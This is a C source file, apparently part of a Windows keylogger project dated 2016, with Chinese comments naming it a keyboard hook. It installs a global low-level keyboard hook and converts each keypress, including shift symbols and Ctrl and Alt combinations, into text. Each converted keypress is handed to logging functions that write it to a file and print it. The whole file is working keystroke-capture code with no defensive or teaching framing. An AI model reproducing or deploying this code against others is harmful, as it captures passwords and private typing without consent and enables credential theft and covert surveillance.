/*
*  文件名：hook.c
*  用途：键盘钩子
*  编程环境：Win10
*  完成日期： 2016.6   Ver 0.01
*  作者： yinhao
*  联系方式： E-mail: yinhao746746@163.com
*/

#include "hook.h"


//DWORD g_tid =0;

HHOOK g_hook =0;


/*
BOOL CALLBACK con_handler(DWORD g_tid)
{
	PostThreadMessage(g_tid, WM_QUIT, 0, 0);
	return TRUE;	
}
*/


LRESULT CALLBACK kb_proc(int code, WPARAM w, LPARAM l)
{
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)l;
	LOG_STRU log;
	if (code==HC_ACTION && w==WM_KEYDOWN)
	{
		hookConvertCode(log.sCode,p->vkCode);
		logGetInfo(&log);
		logWriteFile(log);
		logPrintInfo(log);
	}
	return CallNextHookEx(g_hook, code, w, l);
}

int hookInit(){
	g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, &kb_proc, GetModuleHandle(NULL),0);	//设置全局低级键盘钩子
	if (g_hook==NULL)return -1;
	return 0;
}

int hookDestroy(){
	int ret = 0;
	if (g_hook){
		ret = UnhookWindowsHookEx(g_hook);
	}
	return ret;
}

void hookMessage(){
	MSG msg;
	while(GetMessage(&msg,NULL,0,0)){
		//PeekMessage(&msg,0,0,0,PM_REMOVE)
		TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void hookVirtualKey()
{
	hookInit();
	hookMessage();
	hookDestroy();
//	g_tid = GetCurrentThreadId();
//	SetConsoleCtrlHandler(&con_handler, TRUE);
}


void hookConvertCode(char *sCode, DWORD vkCode){
	if(vkCode>=0x30 && vkCode<=0x39){
		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT)){
			switch(vkCode-0x30){
			case 0:{sprintf(sCode,")");break;}
			case 1:{sprintf(sCode,"!");break;}
			case 2:{sprintf(sCode,"@");break;}
			case 3:{sprintf(sCode,"#");break;}
			case 4:{sprintf(sCode,"$");break;}
			case 5:{sprintf(sCode,"%");break;}
			case 6:{sprintf(sCode,"^");break;}
			case 7:{sprintf(sCode,"&");break;}
			case 8:{sprintf(sCode,"*");break;}
			case 9:{sprintf(sCode,"(");break;}
			default: break;
			}
		}
		else
			sprintf(sCode,"%c",vkCode);
	}
	else if(vkCode>=0x41 && vkCode<=0x5A){
		if(GetKeyState(VK_CAPITAL) || (GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT)))
			sprintf(sCode,"%c",vkCode);
		else
			sprintf(sCode,"%c",vkCode+0x20);
	}
	else if(vkCode>=0x70 && vkCode<=0x7B){
		sprintf(sCode,"F%d",vkCode-0x70+1);
	}
	else if(vkCode==VK_TAB){
		sprintf(sCode,"Tab");
	}
	else if(vkCode==VK_BACK){
		sprintf(sCode,"Backspace");
	}
	else if(vkCode==VK_SPACE){
		sprintf(sCode,"Space");
	}
	else if(vkCode==VK_RETURN){
		sprintf(sCode,"Enter");
	}
	else if(vkCode==VK_LWIN){
		sprintf(sCode,"L_Win");
	}
	else if(vkCode==VK_RWIN){
		sprintf(sCode,"R_Win");
	}
	else if(vkCode==VK_LSHIFT){
		sprintf(sCode,"L_Shift");
	}
	else if(vkCode==VK_RSHIFT){
		sprintf(sCode,"R_Shift");
	}
	else if(vkCode==VK_LCONTROL){
		sprintf(sCode,"L_Ctrl");
	}
	else if(vkCode==VK_RCONTROL){
		sprintf(sCode,"R_Ctrl");
	}
	else if(vkCode==VK_MENU){
		sprintf(sCode,"Alt");
	}
	else if(vkCode==VK_CAPITAL){
		sprintf(sCode,"Caps Lock");
	}
	else if(vkCode==VK_ESCAPE){
		sprintf(sCode,"Esc");
	}
	else if(vkCode==VK_INSERT){
		sprintf(sCode,"Insert");
	}
	else if(vkCode==VK_DELETE){
		sprintf(sCode,"Delete");
	}
	else if(vkCode==VK_HOME){
		sprintf(sCode,"Home");
	}
	else if(vkCode==VK_END){
		sprintf(sCode,"End");
	}
	else if(vkCode==VK_PRIOR){
		sprintf(sCode,"PgUp");
	}
	else if(vkCode==VK_NEXT){
		sprintf(sCode,"PgDn");
	}
	else if(vkCode==0xC0){
		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
			sprintf(sCode,"~");
		else
			sprintf(sCode,"`");
	}
	else if(vkCode==0xDB){
		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
			sprintf(sCode,"{");
		else
			sprintf(sCode,"[");
	}
	else if(vkCode==0xDC){
		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
			sprintf(sCode,"|");
		else
			sprintf(sCode,"\\");
	}
	else if(vkCode==0xDD){
		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
			sprintf(sCode,"}");
		else
			sprintf(sCode,"]");
	}
	else if(vkCode==0xBD){
		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
			sprintf(sCode,"_");
		else
			sprintf(sCode,"-");
	}
	else if(vkCode==0xBB){
		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
			sprintf(sCode,"+");
		else
			sprintf(sCode,"=");
	}
	else if(vkCode==0xBA){
		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
			sprintf(sCode,":");
		else
			sprintf(sCode,";");
	}
	else if(vkCode==0xDE){
		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
			sprintf(sCode,"\"");
		else
			sprintf(sCode,"'");
	}
	else if(vkCode==0xBC){
		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
			sprintf(sCode,"<");
		else
			sprintf(sCode,"Comma");
	}
	else if(vkCode==0xBE){
		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
			sprintf(sCode,">");
		else
			sprintf(sCode,".");
	}
	else if(vkCode==0xBF){
		if(GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_SHIFT))
			sprintf(sCode,"?");
		else
			sprintf(sCode,"/");
	}
	else if(vkCode==VK_LEFT){
		sprintf(sCode,"Left");
	}
	else if(vkCode==VK_UP){
		sprintf(sCode,"Up");
	}
	else if(vkCode==VK_RIGHT){
		sprintf(sCode,"Right");
	}
	else if(vkCode==VK_DOWN){
		sprintf(sCode,"Down");
	}
	else if(vkCode==VK_SCROLL){
		sprintf(sCode,"Scroll Lock");
	}
	else if(vkCode==VK_SNAPSHOT){
		sprintf(sCode,"PrtScn SysRq");
	}
	else if(vkCode==VK_PAUSE){
		sprintf(sCode,"Pause Break");
	}
	else if(vkCode==VK_NUMLOCK){
		sprintf(sCode,"Num Lock");
	}
	else if(vkCode==VK_DIVIDE){
		sprintf(sCode,"/");
	}
	else if(vkCode==VK_MULTIPLY){
		sprintf(sCode,"*");
	}
	else if(vkCode==VK_SUBTRACT){
		sprintf(sCode,"-");
	}
	else if(vkCode>=0x60 && vkCode<=0x69){
		sprintf(sCode,"%d",vkCode-0x60);
	}
	else if(vkCode==VK_DECIMAL){
		sprintf(sCode,".");
	}
	else if(vkCode==VK_ADD){
		sprintf(sCode,"+");
	}
	else{
		sprintf(sCode,"0x%02x",vkCode);
	}
	if(GetAsyncKeyState(VK_MENU) && GetAsyncKeyState(VK_MENU)){
		char temp[CODE_LEN];
		strcpy(temp,sCode);
		strcpy(sCode,"Alt + ");
		strcat(sCode,temp);
	}
	if(GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_CONTROL)){
		char temp[CODE_LEN];
		strcpy(temp,sCode);
		strcpy(sCode,"Ctrl + ");
		strcat(sCode,temp);
	}
}



